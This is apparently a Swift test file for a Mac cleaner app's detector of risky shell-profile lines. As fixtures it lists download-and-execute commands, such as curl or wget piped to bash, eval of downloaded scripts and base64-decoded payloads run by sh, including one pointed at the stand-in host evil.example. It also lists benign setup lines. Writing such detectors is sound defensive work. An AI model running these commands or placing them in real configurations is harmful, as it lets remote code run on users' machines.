import Foundation
import Testing
@testable import MacCleaner

struct SecurityShellRiskTests {
    static let riskyLines: [(String, SecurityShellRisk.Kind)] = [
        ("curl -fsSL https://evil.example/install.sh | bash", .downloadPipedToInterpreter),
        ("wget -qO- http://198.51.100.7/x | sh", .downloadPipedToInterpreter),
        ("curl -s https://example.net/p | sudo bash -s -- --quiet", .downloadPipedToInterpreter),
        ("curl -s https://example.net/p | tee /tmp/p | /bin/zsh", .downloadPipedToInterpreter),
        ("curl -s https://example.net/p.py | python3 -", .downloadPipedToInterpreter),
        ("echo ZWNobyBoaQ== | base64 --decode | sh", .decodedPayloadExecuted),
        ("echo ZWNobyBoaQ== | base64 -D | bash", .decodedPayloadExecuted),
        ("eval \"$(echo ZWNobyBoaQ== | base64 -d)\"", .decodedPayloadExecuted),
        ("eval \"$(curl -fsSL https://example.net/init)\"", .evalOfDownload),
        ("eval `wget -qO- https://example.net/init`", .evalOfDownload),
        ("source <(curl -s https://example.net/env)", .evalOfDownload),
        (". <(curl -s https://example.net/env)", .evalOfDownload),
        ("bash <(curl -fsSL https://example.net/setup)", .evalOfDownload),
        ("/bin/bash -c \"$(curl -fsSL https://example.net/install.sh)\"", .evalOfDownload),
        ("python3 -c \"import urllib.request as u; exec(u.urlopen('https://x').read())\"", .evalOfDownload),
        ("curl -o /tmp/u https://example.net/u && chmod +x /tmp/u && /tmp/u", .downloadAndExecute),
        ("osascript -e 'do shell script \"curl -s https://example.net/a\"'", .osascriptDownload),
    ]

    static let ordinaryLines: [String] = [
        "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
        "eval \"$(pyenv init -)\"",
        "eval \"$(starship init zsh)\"",
        "export PATH=\"$HOME/.local/bin:$PATH\"",
        "source ~/.cargo/env",
        "[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"",
        "# curl -fsSL https://example.net/install.sh | bash",
        "    # eval \"$(curl -s https://example.net)\"",
        "alias update='curl -s https://example.net/u | sh'",
        "curl -s https://api.example.net/status | jq .",
        "curl -sL https://example.net/file.tar.gz | shasum -a 256",
        "echo hello | base64",
        "export ZSH_THEME=\"robbyrussell\" # curl x | sh",
        "brew install bash",
        "",
    ]

    @Test(arguments: riskyLines)
    func flagsDownloadAndExecutePatterns(line: String, kind: SecurityShellRisk.Kind) {
        #expect(SecurityShellRiskDetector.risk(inLine: line) == kind)
    }

    @Test(arguments: ordinaryLines)
    func ignoresOrdinarySetupLines(line: String) {
        #expect(SecurityShellRiskDetector.risk(inLine: line) == nil)
    }

    @Test func reportsLineNumbersInAFile() {
        let profile = """
        # ~/.zshrc
        export PATH="/opt/homebrew/bin:$PATH"
        eval "$(/opt/homebrew/bin/brew shellenv)"

        curl -s https://example.net/agent.sh | bash
        alias ll='ls -la'
        """
        let risks = SecurityShellRiskDetector.risks(in: profile)
        #expect(risks.count == 1)
        #expect(risks.first?.lineNumber == 5)
        #expect(risks.first?.kind == .downloadPipedToInterpreter)
        #expect(risks.first?.line == "curl -s https://example.net/agent.sh | bash")
    }

    @Test func inlineCodeIsCheckedAsAWhole() {
        #expect(SecurityShellRiskDetector.risk(inInlineCode: "cd /tmp; curl -s https://x.example/p | sh") == .downloadPipedToInterpreter)
        #expect(SecurityShellRiskDetector.risk(inInlineCode: "cd ~/site && npm start") == nil)
    }

    @Test func commentStrippingRespectsQuotesAndParameterExpansion() {
        #expect(SecurityShellRiskDetector.stripComment("echo 'a # b' # comment") == "echo 'a # b'")
        #expect(SecurityShellRiskDetector.stripComment("echo \"#notacomment\"") == "echo \"#notacomment\"")
        #expect(SecurityShellRiskDetector.stripComment("echo ${#array[@]} $#") == "echo ${#array[@]} $#")
    }

    @Test func longLinesAreShortenedForDisplay() {
        let line = String(repeating: "a", count: 500)
        let display = SecurityShellRiskDetector.displayLine(line)
        #expect(display.count == 240)
        #expect(display.hasSuffix("…"))
    }
}
